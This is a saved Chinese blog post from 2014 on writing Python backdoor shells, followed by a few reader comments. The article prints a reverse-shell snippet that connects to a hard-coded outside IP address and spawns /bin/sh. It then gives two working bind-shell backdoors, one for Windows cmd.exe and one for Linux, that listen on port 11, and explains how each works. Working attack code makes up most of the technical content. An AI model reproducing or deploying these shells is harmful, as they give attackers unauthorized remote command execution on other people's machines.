@@ -1,0 +1,357 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./python正向连接后门  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./python正向连接后门  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./python正向连接后门  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>python正向连接后门 | 离别歌</title>
+<link href="./python正向连接后门  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./python正向连接后门  离别歌/styles.css" rel="stylesheet"/>
+<link href="./python正向连接后门  离别歌/style.css" rel="stylesheet"/>
+<link href="./python正向连接后门  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./python正向连接后门  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./python正向连接后门  离别歌/jquery.min.js"></script>
+<link href="./python正向连接后门  离别歌/code.css" rel="stylesheet"/>
+<link href="./python正向连接后门  离别歌/button.css" rel="stylesheet"/>
+<link href="./python正向连接后门  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./python正向连接后门  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html&amp;text=python%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html&amp;title=python%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html&amp;is_video=false&amp;description=python%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=python%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8&amp;body=Check out this article: https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html&amp;title=python%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html&amp;title=python%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html&amp;title=python%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html&amp;title=python%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PYTHON/python-shell-backdoor.html&amp;name=python%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">python正向连接后门</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年4月12日 00:12" itemprop="datePublished">
+                    2014 四月 12 00:12
+                </time>
+</div>
+<div class="article-tag">
+            阅读：8861
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PYTHON">Python</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/python">python</a>,
+                
+                <a class="tag-link" href="/tag/cmd%E5%90%8E%E9%97%A8">cmd后门</a>,
+                
+                <a class="tag-link" href="/tag/socket">socket</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+            python在linux下的反弹shell代码我相信很多人都见过：
+<pre class="brush: python;auto-links: false;">import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("59.188.234.64",14575))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"]);</pre>
+<p>
+	    原理很简单。新建一个socket，并将0、1、2分别代表系统的stdin、stdout、stderr（标准输入、输出、错误）重定向到socket中，然后开启一个shell。这样我们从socket中传来的命令就会进入系统的标准输入（就跟键盘输入的效果一样了），系统的输出和错误就会重定向到socket中，被我们客户端获取。但这个弹shell脚本只能在linux下使用。
+</p>
+<p>
+	    那么，本文着重讨论正向连接的shell，特别是windows下的cmdshell。
+</p>
+<p>
+	    我们唯一的要求就是交互式。举个例子，我nc连接上后，执行cd xx目录进入某目录，再执行dir能够列出该目录下文件，而不是再开启一个cmd，又列出默认目录下文件。一定要是交互式的，不能是伪交互式。
+</p>
+<p>
+	    还有一个测试方式。我们执行set a=1，再执行echo %a%，如果输出的是1，说明是交互式，否则不是交互式。
+</p>
+<p>
+	    关于交互式正向连接shell，有几个点需要注意<br>
+<br>
+<strong>    </strong><strong>1.不管在linux还是windows下，想要做到交互式，就只能开启一个shell。不能够每次接收到命令就再开启一个shell进程，然后执行，这样做的效果和os.system('命令')类似，就不用搞这么复杂了。</strong><br/>
+<strong>    </strong><strong>2.windows下cmd.exe /K参数是保持cmd不结束，/c参数是执行完后就结束，注意区别。</strong><br/>
+<br/>
+    我之前的想法是，python首先新建一个socket监听端口等待连接。客户端连接上以后，就开启一个shell进程，然后把进程的标准输入输出错误（stdin、stdout、stderr）都重定向到管道中，通过管道和python程序连接，py中的subprocess库已为我们封装好了这个功能，我们不用自己再新建管道了。<br/>
+    然后进入一个循环，每次读取一下socket中数据，然后写入stdin中，通过管道传输给shell，shell执行完后，我用stdout.read()将结果读取到，再send给客户端。<br/>
+<br/>
+    想法很单纯很美妙，但实践起来就出问题了。python中read不是异步的，只有读取指定字节或读取到EOF才会返回结果。如果没有EOF那么read就一直读，程序阻塞在这里，于是表现出来就是卡死了。我nc中输入dir，什么返回都没有。只要把python关掉，那边才会返回一个结果。<br/>
+    所以，解决思路有四：<br/>
+<strong>    </strong><strong>1.如果能知道shell向管道里写入了多少字节数据，我read(n)读取这个字节数据即可</strong><br/>
+<strong>    </strong><strong>2.如果有异步的read函数，调用也能解决问题</strong><br/>
+<strong>    </strong><strong>3.实在没办法，可以另开启一个线程，专门读取管道中的数据</strong><br/>
+<strong>    </strong><strong>4.不使用管道，直接把shell的输入输出定向到socket中。不过在windows下使用总报错，后面再讲。</strong><br/>
+<br/>
+    思路1、2，我是没想到好办法的。没办法知道管道内数据的大小，没找到异步read函数。<br/>
+    我用思路3写出了windows下的正向连接cmdshell：
+</br></br></p>
+<pre class="brush: python;auto-links: false;">from socket import *
+import subprocess
+import os, threading
+
+def send(talk, proc):
+        import time
+        while True:
+                msg = proc.stdout.readline()
+                talk.send(msg)
+
+if __name__ == "__main__":
+        server=socket(AF_INET,SOCK_STREAM)
+        server.bind(('0.0.0.0',11))
+        server.listen(5)
+        print 'waiting for connect'
+        talk, addr = server.accept()
+        print 'connect from',addr
+        proc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE, 
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        t = threading.Thread(target = send, args = (talk, proc))
+        t.setDaemon(True)
+        t.start()
+        while True:
+                cmd=talk.recv(1024)
+                proc.stdin.write(cmd)
+                proc.stdin.flush()
+        server.close()</pre>
+<p>
+	    测试可用，是交互式的：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201404/f9961397235845.jpg" id="ematt:483" target="_blank"><a href="https://www.leavesongs.com/content/uploadfile/201404/fac41397237176.jpg" id="ematt:497" target="_blank"><a href="https://www.leavesongs.com/content/uploadfile/201404/f9961397237156.jpg" id="ematt:491" target="_blank"><img alt="03.jpg" border="0" height="207" src="./python正向连接后门  离别歌/thum-f9961397237156.jpg" title="点击查看原图" width="650"/></a></a></a>
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201404/2de41397235847.jpg" id="ematt:485" target="_blank"><a href="https://www.leavesongs.com/content/uploadfile/201404/2de41397237157.jpg" id="ematt:493" target="_blank"><img alt="04.jpg" border="0" height="510" src="./python正向连接后门  离别歌/thum-2de41397237157.jpg" title="点击查看原图" width="650"/></a></a>
+</p>
+<p>
+	    用了多线程，开启了一个新线程，这个线程专门从stdout中read数据，即使阻塞也不会影响主线程的socket过程。<br/>
+<br/>
+    我用思路4写了一个linux版本，可以完美使用：
+</p>
+<pre class="brush: python;auto-links: false;">from socket import *
+import subprocess
+import os, threading, sys, time
+
+if __name__ == "__main__":
+        server=socket(AF_INET,SOCK_STREAM)
+        server.bind(('0.0.0.0',11))
+        server.listen(5)
+        print 'waiting for connect'
+        talk, addr = server.accept()
+        print 'connect from',addr
+        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
+                stdout=talk, stderr=talk, shell=True)</pre>
+    <span style="color:#444444;font-family:Verdana, Helvetica, Arial, sans-serif;font-size:14px;line-height:22.390625px;white-space:normal;background-color:#FFFFFF;">效果：</span>
+<p>
+<br/>
+</p>
+<p>
+<a href="https://www.leavesongs.com/content/uploadfile/201404/13501397235848.jpg" id="ematt:487" target="_blank"><a href="https://www.leavesongs.com/content/uploadfile/201404/13501397237159.jpg" id="ematt:495" target="_blank"><img alt="05.jpg" border="0" height="359" src="./python正向连接后门  离别歌/thum-13501397237159.jpg" title="点击查看原图" width="650"/></a></a>
+</p>
+<p>
+	    直接在popen的时候，将新建进程的stdin、stdout、stderr都重定向到socket中。这样就可以不使用管道通信了。这也是C语言下零管道后门的原理。<br/>
+但不知道为什么，我写了一个windows版本，总是报错：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201404/fac41397235850.jpg" id="ematt:489" target="_blank"><a href="https://www.leavesongs.com/content/uploadfile/201404/fac41397237176.jpg" id="ematt:497" target="_blank"><img alt="06.jpg" border="0" height="200" src="./python正向连接后门  离别歌/fac41397237176.jpg" title="点击查看原图" width="623"/></a></a>
+</p>
+<p>
+	    不太能理解，windows版本就把/bin/sh替换成cmd.exe，但就出这个错。<br/>
+    以上是我对python下正向连接shell的分析，希望能帮到同样有困惑的人，其中纰漏与错误，能得到大家的斧正！
+</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2450">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./python正向连接后门  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">knight110</a>
+<time datetime="2016年10月11日 11:39" itemprop="datePublished">
+                            2016 十月 11 11:39
+                        </time>
+<a href="javascript:reply_to('2450', 'knight110')">回复</a>
+</p>
+<p class="comment-meta">代码 易懂，但是 还是 这样 就没有办法 输出 stderr</p>
+</div>
+</div>
+<div class="row" id="comment-1651">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./python正向连接后门  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">em</a>
+<time datetime="2014年5月27日 23:47" itemprop="datePublished">
+                            2014 五月 27 23:47
+                        </time>
+<a href="javascript:reply_to('1651', 'em')">回复</a>
+</p>
+<p class="comment-meta">好棒的代码～</p>
+</div>
+</div>
+<div class="row" id="comment-1606">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./python正向连接后门  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://dididada.dazdingo.net" target="_blank">滴滴答答</a>
+<time datetime="2014年4月16日 16:41" itemprop="datePublished">
+                            2014 四月 16 16:41
+                        </time>
+<a href="javascript:reply_to('1606', '滴滴答答')">回复</a>
+</p>
+<p class="comment-meta">学弟你好~学弟再见~为何没有表情可以添加啊~orz~</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1607">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./python正向连接后门  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年4月16日 16:50" itemprop="datePublished">
+                            2014 四月 16 16:50
+                        </time>
+<a href="javascript:reply_to('1607', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@滴滴答答：等我研究一下，加个表情进来</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1604">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./python正向连接后门  离别歌/105c85aeb120295456bab3fafd2a4e75.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://task.renwuyi.com" target="_blank">悬赏任务</a>
+<time datetime="2014年4月14日 17:04" itemprop="datePublished">
+                            2014 四月 14 17:04
+                        </time>
+<a href="javascript:reply_to('1604', '悬赏任务')">回复</a>
+</p>
+<p class="comment-meta">路过留名</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="71c670e73b54db8d7ba77d2c809d8abe56d42c66"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./python正向连接后门  离别歌/71c670e73b54db8d7ba77d2c809d8abe56d42c66"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="310">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="fBjjjjw4By6qfaph5qOc4e1Vb0h9zX2aNVEP7NIj2l0PfPNwTHiWDS30k4KhirRk"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./python正向连接后门  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./python正向连接后门  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
